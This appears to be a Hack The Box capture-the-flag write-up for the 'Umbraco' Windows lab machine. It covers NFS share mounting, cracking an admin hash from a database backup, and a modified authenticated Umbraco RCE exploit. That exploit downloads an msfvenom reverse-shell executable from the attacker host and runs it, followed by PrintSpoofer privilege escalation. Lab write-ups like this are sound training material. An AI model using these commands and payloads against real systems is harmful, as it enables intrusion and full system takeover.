# HTB Umbraco

**Machine Information**

	IP : 10.10.10.180
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.180 -- -sC -sV
```

```
PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind?      syn-ack
| rpcinfo:
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
2049/tcp  open  mountd        syn-ack 1-3 (RPC #100005)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 59m58s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 45222/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 37026/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15893/udp): CLEAN (Timeout)
|   Check 4 (port 17000/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2024-08-01T08:57:27
|_  start_date: N/A
```

### Getting a Foothold

**FTP**

There is an FTP server running on port 21 with anonymous access enabled. Unfortunately there were no files stored there.

**SMB**

Anonymous access is not enabled for SMB so we can't do anything for now.

**NFS**

Check NFS for mountable shares.

```
showmount -e 10.10.10.180
```

There is one available that everyone can access.

```
Export list for 10.10.10.180:
/site_backups (everyone)
```

Create a new folder in the `/tmp` directory and mount the NFS share.

```
mkdir /tmp/site_backups                                                         sudo mount -t nfs 10.10.10.180:/site_backups /tmp/site_backups -o nolock
```

Inside this share we can see a client called Umbraco. A quick search shows that it is an open-source .NET CMS.

**Dirsearch**

There is a web server running on port 80 so we can use `dirsearch` to find additional directories.

```
dirsearch -u http://10.10.10.180
```

This reveals a folder called `umbraco` that leads us to a login page.

```
[18:16:34] 302 -  126B  - /install  ->  /umbraco/
```

**SDF file**

Common default passwords don't work but we have a backup of the website which may contain credentials. Using `grep` to search for "Administrator" reveals an `.sdf` file as the first result.

```
grep -r "Administrator" /tmp/site_backups/
```

```
grep: /tmp/site_backups/App_Data/Umbraco.sdf: binary file matches
```

A quick search shows that an `.sdf` file is a "Microsoft SQL Server Compact Edition database file". If we run `strings` and `grep` on it we can find the instance of "Administrator" and what appears to be a password.

```
strings /tmp/site_backups/App_Data/Umbraco.sdf | grep "Administrator"
```

Copy this hash to a file and we can use `john` to crack it.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

We can now sign into the web server using these credentials.

**NOTE:** the username requires the email address `admin@htb.local`

**Find exploit**

With an authenticated session we can now the system is running version 7.12.4 of Umbraco CMS. If we check `searchsploit` for known exploits there are two possible candidate.

```
searchsploit umbraco
```

```
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                              | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                              | aspx/webapps/49488.py
```

I used the first exploit but the second one may work as well. Modify the python script to include out username, password, and target host. The payload will need to modified as well. I configured mine to use `powershell.exe` to retrieve a reverse shell from my python server. 

**Upload exploit**

Make the following changes:
- Change the `proc.StartInfo.FileName` to `powershell.exe`.
- Change the `string cmd` to the following:

```
mkdir C:/temp
```

Run the python script to create a new folder for us to upload our reverse shell.

```
python3 46153.py
```

Change the `string cmd` to the following to upload our payload.

```
wget http://10.10.14.21/shelly.exe -Outfile C:/temp/shelly.exe
```

The exploit should be working we need to create the payload. Use `msfvenom` to generate a reverse shell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=9001 -f exe > shelly.exe
```

Start a python server on port 80 and run the exploit.

```
python3 -m http.server 80
```

```
python3 46153.py
```

If successful we should get a hit on our python server.

**Run exploit**

Now update the `string cmd` variable to the following:

```
C:/temp/shelly.exe
```

Start a `netcat` listener and run the exploit to get a shell.

```
C:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Success! Grab the user flag.

```
type C:\Users\Public\Desktop\user.txt
```

### Privilege Escalation

Check the privileges for our current user.

```
whoami /priv
```

It shows that we have the `SeImpersonatePrivilege` enabled so we can potentially escalate our privileges. Upload `PrintSpoofer` to the target machine and run it to get an elevated shell.

```
.\PrintSpoofer64.exe -i -c cmd
```

Grab the flag.

```
type C:\Users\Administrator\Desktop\root.txt
```
